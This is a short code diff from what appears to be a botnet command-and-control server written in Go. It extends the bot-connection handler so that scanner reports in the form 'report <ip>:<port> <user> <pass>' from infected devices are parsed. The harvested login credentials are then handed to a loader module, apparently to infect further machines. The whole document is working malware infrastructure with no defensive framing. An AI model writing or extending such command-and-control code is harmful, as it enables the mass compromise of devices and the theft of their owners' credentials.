@@ -2,6 +2,7 @@ package bot
 
 import (
 	"bufio"
+	"cnc/internal/loader"
 	"cnc/internal/logger"
 	"cnc/internal/models"
 	"cnc/internal/state"
@@ -126,7 +127,7 @@ func handleBot(bot *models.Bot) {
 	reader := bufio.NewReader(bot.Conn)
 	for {
 		bot.Conn.SetReadDeadline(time.Now().Add(45 * time.Second))
-		_, err := reader.ReadString('\n')
+		line, err := reader.ReadString('\n')
 		if err != nil {
 			cause := "EOF"
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
@@ -136,6 +137,19 @@ func handleBot(bot *models.Bot) {
 			}
 			logger.LogBotDisconnect(cause, botArch, botIP)
 			return
+		}
+
+		line = strings.TrimSpace(line)
+
+		// handle scanner reports: "report <ip>:<port> <user> <pass>"
+		if strings.HasPrefix(line, "report ") {
+			parts := strings.Fields(line)
+			if len(parts) >= 4 {
+				addrParts := strings.SplitN(parts[1], ":", 2)
+				if len(addrParts) == 2 {
+					loader.AddCredential(addrParts[0], addrParts[1], parts[2], parts[3])
+				}
+			}
 		}
 	}
 }
